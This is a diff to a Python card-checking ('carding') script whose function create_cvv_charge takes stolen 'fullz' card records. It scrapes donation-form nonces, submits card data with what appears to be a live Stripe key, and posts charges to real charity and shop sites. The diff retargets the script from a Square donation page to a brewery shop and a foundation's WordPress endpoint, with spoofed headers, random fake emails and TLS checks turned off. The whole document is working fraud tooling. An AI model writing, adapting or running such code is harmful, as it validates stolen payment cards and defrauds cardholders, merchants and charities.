@@ -67,7 +67,7 @@ async def create_cvv_charge(fullz , session):
         email="craish"+str(random.randint(548,98698))+"niki@gmail.com"
 
         headers = {
-    'authority': 'https://donate-to-lincoln-109850.square.site/',
+    'authority': 'shop.wiseacrebrew.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'max-age=0',
@@ -82,7 +82,7 @@ async def create_cvv_charge(fullz , session):
     'user-agent': agent,
 }
         
-        req1 = session.get("https://donate-to-lincoln-109850.square.site/s/checkout", headers=headers,  verify=False, timeout=30)
+        req1 = session.get("https://shop.wiseacrebrew.com/account/add-payment-method/", headers=headers,  verify=False, timeout=30)
         nonce = re.findall(r'name="_charitable_donation_nonce" value="(.*?)"', req1.text)[0]
         form_id = re.findall(r'name="charitable_form_id" value="(.*?)"', req1.text)[0]
                 
@@ -120,7 +120,7 @@ async def create_cvv_charge(fullz , session):
         'guid':f'{guid}',
         'muid':f'{muid}',
         'sid':f'{sid}',
-        'referrer':'https://donate-to-lincoln-109850.square.site/',
+        'referrer':'https://shop.wiseacrebrew.com',
         'time_on_page': ptime,
         'key':'pk_live_51IK8KECy7gKATUV9t1d0t32P2r0P54BYaeaROb0vL6VdMJzkTpvZc6sIx1W7bKXwEWiH7iQT3gZENUMkYrdvlTte00PxlESxxt'
 }
@@ -132,12 +132,12 @@ async def create_cvv_charge(fullz , session):
                 pass
         print(id)
         headers = {
-    'authority': 'https://donate-to-lincoln-109850.square.site',
+    'authority': 'pipelineforchangefoundation.com',
     'accept': 'application/json, text/javascript, */*; q=0.01',
     'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    'origin': 'https://donate-to-lincoln-109850.square.site',
-    'referer': 'https://donate-to-lincoln-109850.square.site',
+    'origin': 'https://shop.wiseacrebrew.com/account',
+    'referer': 'https://shop.wiseacrebrew.com/account/add-payment-method/',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
@@ -177,7 +177,7 @@ async def create_cvv_charge(fullz , session):
             'form_action': 'make_donation',
         }
 
-        req3 = session.post("https://pipelineforchangefoundation.com/wp-admin/admin-ajax.php", headers=headers, data=data, verify=False, timeout=30)
+        req3 = session.post("https://pipelineforchangefoundation.com/wp-admin/admin-ajax.php", headers=headers, data=data,  verify=False, timeout=30)
         print(req3.text)
         await asyncio.sleep(2)
         return req3
